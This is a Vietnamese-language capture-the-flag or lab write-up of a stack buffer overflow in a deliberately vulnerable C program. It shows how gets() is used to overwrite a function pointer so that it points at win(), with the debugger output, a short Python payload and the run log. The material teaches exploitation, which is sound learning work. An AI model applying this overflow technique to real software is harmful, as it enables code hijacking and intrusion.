# Preview
Source code:
```shell
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);     <---- vuln

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Tổng quan:
- Biến con trỏ *fp
- Vuln nằm ở hàm gets(buffer)
- Ý tưởng: thay đổi giá trị biến fp để trỏ sang hàm win().

# Exploit

Tính toán offset

Biến buffer[] và biến fp tương tự như stack0.
```shell
.....
   0x080491fc <+75>:    add    esp,0x10
   0x080491ff <+78>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08049202 <+81>:    call   eax  <--- call tới hàm có địa chỉ có giá trị là biến fp
....
```
Giá trị của biến fp được ghi đè phải bằng địa chỉ của hàm win() trong chương trình.
```shell
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  puts@plt
0x08049070  _start
0x0804909d  __wrap_main
0x080490b0  _dl_relocate_static_pie
0x080490c0  __x86.get_pc_thunk.bx
0x080490d0  deregister_tm_clones
0x08049110  register_tm_clones
0x08049150  __do_global_dtors_aux
0x08049180  frame_dummy
0x08049186  win         <---- địa chỉ hàm win()
0x080491b1  main
0x08049213  __x86.get_pc_thunk.ax
0x08049218  _fini
```

**Payload**
```shell
buffer = "a" * 64
win = "\x86\x91\x04\x08"        # litte endian

print(buffer + win)
```

**Attack**
```shell
└─$ python2 payload.py > input
```
```shell
└─$ ./vuln < input
calling function pointer, jumping to 0x08049186
code flow successfully changed
Segmentation fault
```

